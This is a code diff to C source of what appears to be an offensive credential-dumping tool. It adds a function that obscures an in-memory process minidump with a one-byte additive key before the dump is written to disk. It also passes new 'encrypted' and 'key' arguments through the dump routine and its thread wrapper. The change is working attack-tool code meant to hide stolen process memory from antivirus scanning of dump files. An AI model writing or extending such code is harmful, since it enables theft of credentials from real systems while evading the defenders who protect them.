@@ -39,6 +39,17 @@ BOOL appendToDump(DUMP_CONTEXT* dumpContext, const PVOID data, DWORD size) {
     
 }
 
+VOID EncryptDumpContextBuffer(DUMP_CONTEXT* context, unsigned char key) {
+    if (!context->BaseAddress || !context->RVA) {
+        return;
+    }
+
+    unsigned char* buffer = context->BaseAddress;
+    for (size_t n = 0; n < context->RVA; n++) {
+        buffer[n] += key;
+    }
+}
+
 BOOL writeMiniDumpHeader(DUMP_CONTEXT* dumpContext) {
     MINIDUMP_HEADER header = { 0 };
     header.Signature = dumpContext->Signature;
@@ -356,7 +367,7 @@ DWORD writeMiniDumpMemory64ListStream(DUMP_CONTEXT* dumpContext, PMEMORY_PAGE_IN
     return STATUS_SUCCES;
 }
 
-DWORD SandMiniDumpWriteDump(TCHAR* targetProcessName, WCHAR* dumpFilePath) {
+DWORD SandMiniDumpWriteDump(TCHAR* targetProcessName, WCHAR* dumpFilePath, BOOL encrypted, int key) {
     DWORD status = STATUS_UNSUCCESSFUL;
     DWORD targetProcessPID = 0;
     
@@ -479,7 +490,9 @@ DWORD SandMiniDumpWriteDump(TCHAR* targetProcessName, WCHAR* dumpFilePath) {
     if (!NT_SUCCESS(status)) {
         goto cleanup;
     }
-
+    if (encrypted) {
+        EncryptDumpContextBuffer(&dumpContext, (unsigned char) key);
+    }
     status = NtWriteFile(hDumpFile, NULL, NULL, NULL, &IoStatusBlock, dumpContext.BaseAddress, dumpContext.RVA, NULL, NULL);
     if (!NT_SUCCESS(status)) {
         _tprintf_or_not(TEXT("[-] Syscall process dump failed: failed to write dump to file (NtWriteFile 0x%x).\n"), status);
@@ -516,5 +529,5 @@ cleanup:
 }
 
 DWORD SandMiniDumpWriteDumpFromThread(PVOID* args) {
-    return SandMiniDumpWriteDump(args[0], args[1]);
+    return SandMiniDumpWriteDump(args[0], args[1], args[2] != NULL, (int)(uintptr_t)args[3]);
 }
